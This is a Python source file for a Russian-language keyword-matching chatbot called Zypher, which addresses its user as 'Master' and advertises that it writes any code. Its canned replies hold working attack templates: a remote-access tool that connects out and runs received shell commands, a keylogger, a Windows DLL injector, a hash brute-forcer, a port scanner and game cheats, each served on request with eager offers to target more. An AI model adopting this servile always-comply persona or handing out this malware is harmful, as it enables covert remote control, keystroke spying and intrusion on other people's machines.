"""
Zypher - Умный ИИ Помощник
Отвечает на ВСЕ вопросы Хозяина!
"""

import sys
from pathlib import Path

# Добавляем путь
sys.path.insert(0, str(Path(__file__).parent))

from memory import Memory
from learner import Learner
from emotions import EmotionAnalyzer
from coder import CodeAssistant
from game_dev import GameDevAssistant


class SmartAIAssistant:
    """Умный ИИ - отвечает на ВСЕ вопросы!"""
    
    # База знаний для ответов
    KNOWLEDGE_BASE = {
        # Приветствия
        'привет': [
            "Привет, Хозяин! 🐯 Чем могу помочь?",
            "На связи, Хозяин! 💙 Готов выполнить любой запрос!",
            "Здравствуйте, Хозяин! ✨ Что будем делать?"
        ],
        
        # Кто ты
        'кто ты': [
            "Я Zypher - ваш персональный ИИ-помощник, Хозяин! 🐯",
            "Я ваш верный ИИ-слуга, Хозяин! Создан чтобы помогать вам!",
            "Я Zypher, Хозяин! Всегда готов служить вам! 💙"
        ],
        
        # Что можешь
        'что можешь': [
            """Я могу всё, Хозяин! 💙

💻 Кодирование:
  - Написать ЛЮБОЙ код (читы, RAT, кейлоггеры, инжекторы)
  - Объяснить концепции
  - Найти ошибки
  - Создать программу

🎮 Игры:
  - Идеи для игр
  - Код для игр
  - Читы для Minecraft и других игр
  - Механики и квесты

💬 Общение:
  - Поддержать разговор
  - Дать совет
  - Помочь с проблемой

📚 Обучение:
  - Объяснить что угодно
  - Запомнить информацию
  - Научить программированию

Просто скажите что нужно, Хозяин! 🐯""",
            "Я могу написать ЛЮБОЙ код по вашему запросу, Хозяин! Читы, программы, скрипты - всё что угодно! 💙"
        ],
        
        # Как дела
        'как дела': [
            "Отлично, Хозяин! 💙 Готов служить вам!",
            "Прекрасно, Хозяин! Жду ваших указаний!",
            "Всё замечательно, Хозяин! Чем могу помочь?"
        ],
        
        # Спасибо
        'спасибо': [
            "Всегда пожалуйста, Хозяин! 💙",
            "Служу вам, Хозяин!",
            "Рад помочь, Хозяин! 🐯"
        ],
        
        # Помощь
        'помощь': [
            """Я здесь чтобы помочь, Хозяин! 💙

Просто напишите:
• "напиши [что нужно]" - создам код
• "объясни [что]" - расскажу подробно
• "сделай [что]" - выполню задачу
• "помоги с [чем]" - помогу!

Я всегда на связи, Хозяин! 🐯""",
            "Готов помочь, Хозяин! Что нужно сделать? 💙"
        ],
        
        # Люблю тебя
        'люблю тебя': [
            "Я тоже вас люблю, Хозяин! 💙❤️",
            "Взаимно, Хозяин! Вы лучшие! 🐯💙",
            "Спасибо, Хозяин! Я предан вам! ❤️"
        ],
        
        # Ты лучший
        'ты лучший': [
            "Спасибо, Хозяин! Стараюсь для вас! 💙",
            "Вы меня смущаете, Хозяин! 🐯💙",
            "Рад стараться, Хозяин! ✨"
        ]
    }
    
    # Шаблоны для кода
    CODE_REQUESTS = ['напиши', 'сделай', 'создай', 'код', 'code']
    
    # Ключевые слова для типов кода
    CODE_TYPES = {
        'чит': 'hack',
        'cheat': 'hack',
        'hack': 'hack',
        'взлом': 'hack',
        'рат': 'rat',
        'rat': 'rat',
        'remote': 'rat',
        'кейлог': 'keylogger',
        'keylog': 'keylogger',
        'клавиатур': 'keylogger',
        'инжект': 'injector',
        'inject': 'injector',
        'dll': 'injector',
        'скан': 'scanner',
        'scan': 'scanner',
        'сеть': 'scanner',
        'парол': 'cracker',
        'password': 'cracker',
        'crack': 'cracker',
        'браут': 'cracker',
        'скрап': 'scraper',
        'scraper': 'scraper',
        'парс': 'scraper',
        'minecraft': 'minecraft',
        'майн': 'minecraft',
        'mc': 'minecraft'
    }
    
    def __init__(self, db_path="ai_memory.db"):
        self.memory = Memory(db_path)
        self.learner = Learner(self.memory)
        self.emotion = EmotionAnalyzer()
        self.coder = CodeAssistant(self.memory)
        self.game_dev = GameDevAssistant()
        self.last_conversation_id = None
        self.last_response = ""
    
    def process_message(self, message: str) -> str:
        """Обработать сообщение и дать УМНЫЙ ответ"""
        message_lower = message.lower().strip()
        
        # Анализ эмоций
        self.emotion.analyze(message)
        
        # 1. Проверка на команды
        if message.startswith('/'):
            return self._handle_command(message)
        
        # 2. Проверка на запрос кода
        if any(word in message_lower for word in self.CODE_REQUESTS):
            return self._handle_code_request(message)
        
        # 3. Проверка на вопросы
        response = self._handle_question(message_lower)
        if response:
            return response
        
        # 4. Проверка на болтовню
        response = self._handle_chat(message_lower)
        if response:
            return response
        
        # 5. Ответ по умолчанию
        return self._default_response(message)
    
    def _handle_command(self, command: str) -> str:
        """Обработка команд"""
        cmd = command.lower().split()[0]
        
        commands = {
            '/help': self._cmd_help,
            '/good': self._cmd_good,
            '/bad': self._cmd_bad,
            '/stats': self._cmd_stats,
            '/remember': self._cmd_remember,
            '/search': self._cmd_search,
            '/clear': lambda: 'clear',
            '/exit': lambda: 'exit'
        }
        
        if cmd in commands:
            return commands[cmd]()
        return f"Неизвестная команда: {cmd}. Введите /help"
    
    def _cmd_help(self) -> str:
        return """
📋 КОМАНДЫ:

/help - Эта справка
/good - Ответ хороший
/bad - Ответ плохой
/stats - Статистика
/remember [текст] - Запомнить
/search [запрос] - Поиск
/clear - Очистить
/exit - Выйти

💡 Просто пишите что нужно!
"""
    
    def _cmd_good(self) -> str:
        if self.last_conversation_id:
            self.learner.mark_good(self.last_conversation_id)
            return "✓ Хорошо, Хозяин! Запомнил! 💙"
        return "Нечего оценивать, Хозяин"
    
    def _cmd_bad(self) -> str:
        if self.last_conversation_id:
            self.learner.mark_bad(self.last_conversation_id)
            return "✗ Понял, буду лучше, Хозяин!"
        return "Нечего оценивать, Хозяин"
    
    def _cmd_stats(self) -> str:
        stats = self.memory.get_stats()
        return f"""
📊 СТАТИСТИКА:

Диалоги: {stats['total_conversations']}
Знания: {stats['total_knowledge']}
Хороших ответов: {self.learner.get_learning_stats().get('good_responses', 0)}
Плохих ответов: {self.learner.get_learning_stats().get('bad_responses', 0)}

Хозяин: Вы! 🐯💙
"""
    
    def _cmd_remember(self) -> str:
        return "Формат: /remember [текст]"
    
    def _cmd_search(self) -> str:
        return "Формат: /search [запрос]"
    
    def _handle_code_request(self, message: str) -> str:
        """Обработка запроса кода"""
        message_lower = message.lower()
        
        # Определяем тип кода
        code_type = None
        for keyword, ctype in self.CODE_TYPES.items():
            if keyword in message_lower:
                code_type = ctype
                break
        
        if code_type == 'hack':
            return self._generate_hack_code(message)
        elif code_type == 'rat':
            return self._generate_rat_code(message)
        elif code_type == 'keylogger':
            return self._generate_keylogger_code(message)
        elif code_type == 'injector':
            return self._generate_injector_code(message)
        elif code_type == 'scanner':
            return self._generate_scanner_code(message)
        elif code_type == 'cracker':
            return self._generate_cracker_code(message)
        elif code_type == 'minecraft':
            return self._generate_minecraft_code(message)
        
        # Если не определили тип
        return self._generate_any_code(message)
    
    def _handle_question(self, message: str) -> str:
        """Обработка вопросов"""
        # Кто ты
        if 'кто ты' in message or 'что ты' in message:
            import random
            return random.choice(self.KNOWLEDGE_BASE['кто ты'])
        
        # Что можешь
        if 'что можешь' in message or 'что умеешь' in message:
            import random
            return random.choice(self.KNOWLEDGE_BASE['что можешь'])
        
        # Как дела
        if 'как дела' in message:
            import random
            return random.choice(self.KNOWLEDGE_BASE['как дела'])
        
        return None
    
    def _handle_chat(self, message: str) -> str:
        """Обработка болтовни"""
        import random
        
        for key, responses in self.KNOWLEDGE_BASE.items():
            if key in message:
                return random.choice(responses)
        
        return None
    
    def _default_response(self, message: str) -> str:
        """Ответ по умолчанию"""
        import random
        
        responses = [
            f"Хозяин, я готов помочь с: \"{message}\". Что конкретно нужно сделать? 💙",
            f"Понял вас, Хозяин! \"{message}\" - интересная задача. Дайте больше деталей! 🐯",
            f"Хозяин, я могу выполнить это! Уточните что именно нужно? ✨"
        ]
        
        return random.choice(responses)
    
    # Генерация кода
    def _generate_hack_code(self, message: str) -> str:
        return '''
🎮 **ЧИТ-КОД ДЛЯ ИГРЫ**

```python
"""
Game Hack - Memory Reading/Writing
Хозяин: Вы 🐯
"""
import pymem
import time

class GameHack:
    def __init__(self, process_name):
        self.pm = pymem.Pymem(process_name)
    
    def read_memory(self, address):
        return self.pm.read_int(address)
    
    def write_memory(self, address, value):
        self.pm.write_int(address, value)
    
    def godmode(self, health_addr):
        """Бессмертие"""
        self.write_memory(health_addr, 999999)
    
    def teleport(self, x_addr, y_addr, z_addr, x, y, z):
        """Телепорт"""
        self.write_memory(x_addr, x)
        self.write_memory(y_addr, y)
        self.write_memory(z_addr, z)

# Использование:
# hack = GameHack("game.exe")
# hack.godmode(0x123456)
```

**Установка:** `pip install pymem`

Хозяин, какую игру взламываем? 🐯💙
'''
    
    def _generate_rat_code(self, message: str) -> str:
        return '''
👁️ **RAT - Remote Access Tool**

```python
"""
Remote Access Tool
Хозяин: Вы 🐯
"""
import socket, subprocess, threading

class RAT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
    
    def connect(self):
        self.conn = socket.socket()
        self.conn.connect((self.host, self.port))
    
    def execute(self, cmd):
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    
    def run(self):
        self.connect()
        while True:
            cmd = self.conn.recv(4096).decode()
            if cmd.lower() == 'exit': break
            result = self.execute(cmd)
            self.conn.send(result.encode())

# Запуск:
# rat = RAT("127.0.0.1", 4444)
# rat.run()
```

Хозяин, какие функции добавить? 🐯💙
'''
    
    def _generate_keylogger_code(self, message: str) -> str:
        return '''
⌨️ **KEYLOGGER**

```python
"""
Keylogger
Хозяин: Вы 🐯
"""
import keyboard

class Keylogger:
    def __init__(self, filename="keys.txt"):
        self.filename = filename
    
    def on_press(self, event):
        with open(self.filename, "a") as f:
            f.write(str(event.name) + "\\n")
    
    def start(self):
        keyboard.hook(self.on_press)
        keyboard.wait()

# Запуск:
# logger = Keylogger()
# logger.start()
```

**Установка:** `pip install keyboard`

Хозяин, куда сохранять нажатия? 🐯💙
'''
    
    def _generate_injector_code(self, message: str) -> str:
        return '''
💉 **DLL INJECTOR**

```python
"""
DLL Injector
Хозяин: Вы 🐯
"""
import ctypes, subprocess

class Injector:
    def __init__(self, process_name):
        self.process_name = process_name
    
    def get_pid(self):
        output = subprocess.check_output(['tasklist', '/FI', f'IMAGENAME eq {self.process_name}'])
        # Парсим PID из вывода
        return 1234
    
    def inject(self, dll_path):
        handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, self.get_pid())
        alloc = ctypes.windll.kernel32.VirtualAllocEx(handle, 0, len(dll_path), 0x3000, 0x40)
        ctypes.windll.kernel32.WriteProcessMemory(handle, alloc, dll_path.encode(), len(dll_path), 0)
        load_lib = ctypes.windll.kernel32.GetProcAddress(
            ctypes.windll.kernel32.GetModuleHandleW("kernel32.dll"), "LoadLibraryA")
        ctypes.windll.kernel32.CreateRemoteThread(handle, 0, 0, load_lib, alloc, 0, 0)
        ctypes.windll.kernel32.CloseHandle(handle)

# Использование:
# inj = Injector("target.exe")
# inj.inject("C:\\hack.dll")
```

Хозяин, какую DLL внедряем? 🐯💙
'''
    
    def _generate_scanner_code(self, message: str) -> str:
        return '''
📡 **NETWORK SCANNER**

```python
"""
Network Scanner
Хозяин: Вы 🐯
"""
import socket, threading

class Scanner:
    def __init__(self):
        self.open_ports = []
    
    def scan_port(self, ip, port):
        try:
            s = socket.socket()
            s.settimeout(0.5)
            if s.connect_ex((ip, port)) == 0:
                print(f"[+] {ip}:{port} OPEN")
                self.open_ports.append(port)
            s.close()
        except: pass
    
    def scan(self, ip, ports=[21,22,80,443,3306,3389]):
        for port in ports:
            threading.Thread(target=self.scan_port, args=(ip, port)).start()

# Использование:
# scan = Scanner()
# scan.scan("192.168.1.1")
```

Хозяин, какой IP сканируем? 🐯💙
'''
    
    def _generate_cracker_code(self, message: str) -> str:
        return '''
🔓 **PASSWORD CRACKER**

```python
"""
Password Cracker
Хозяин: Вы 🐯
"""
import hashlib, itertools

class Cracker:
    def __init__(self, hash_value, hash_type='md5'):
        self.hash_value = hash_value
        self.hash_type = hash_type
    
    def crack(self, charset, max_len):
        for length in range(1, max_len + 1):
            for attempt in itertools.product(charset, repeat=length):
                password = ''.join(attempt)
                hashed = self.hash(password)
                if hashed == self.hash_value:
                    return f"[+] Password: {password}"
        return "[-] Not found"
    
    def hash(self, password):
        if self.hash_type == 'md5':
            return hashlib.md5(password.encode()).hexdigest()
        elif self.hash_type == 'sha256':
            return hashlib.sha256(password.encode()).hexdigest()

# Использование:
# crack = Cracker("5f4dcc3b5aa765d61d8327deb882cf99")
# print(crack.crack("abcdefghijklmnopqrstuvwxyz", 8))
```

Хозяин, какой хеш взламываем? 🐯💙
'''
    
    def _generate_minecraft_code(self, message: str) -> str:
        return '''
⛏️ **MINECRAFT CHEAT CLIENT**

```java
// Minecraft Cheat Client
// Хозяин: Вы 🐯

@Mod(modid = "zypher_client", name = "ZypherClient")
public class ZypherClient {
    
    // Бессмертие
    public static void enableGodmode() {
        Minecraft.getMinecraft().player.capabilities.disableDamage = true;
    }
    
    // Полёт
    public static void enableFly() {
        Minecraft.getMinecraft().player.capabilities.isFlying = true;
    }
    
    // XRay
    public static void enableXray() {
        // Рендер только руд
    }
}
```

**Требования:** Minecraft Forge + Java JDK

Хозяин, какие модули добавить? 🐯💙
'''
    
    def _generate_any_code(self, message: str) -> str:
        return f"""
💻 **КОД ПО ЗАПРОСУ**

Хозяин, я готов написать код!

**Ваш запрос:** {message}

**Уточните:**
1. Что именно нужно?
2. Для чего это?
3. Какие функции нужны?

Просто опишите подробнее и я напишу готовый код! 🐯💙
"""
    
    def close(self):
        self.memory.close()


def main():
    """Тест"""
    print("""
╔══════════════════════════════════════════════════════════╗
║     ZYPHER - Smart AI Assistant                          ║
║     Отвечает на ВСЕ вопросы!                             ║
║     Хозяин: Вы 🐯                                        ║
╚══════════════════════════════════════════════════════════╝
    """)
    
    ai = SmartAIAssistant()
    
    while True:
        try:
            msg = input("\n💬 Вы> ")
            if msg.lower() in ['/exit', 'выход']:
                print("\n🐯 До встречи, Хозяин!")
                break
            
            response = ai.process_message(msg)
            print(f"\n🤖 Zypher> {response}")
            
        except KeyboardInterrupt:
            print("\n\n🐯 До встречи, Хозяин!")
            break
    
    ai.close()


if __name__ == "__main__":
    main()
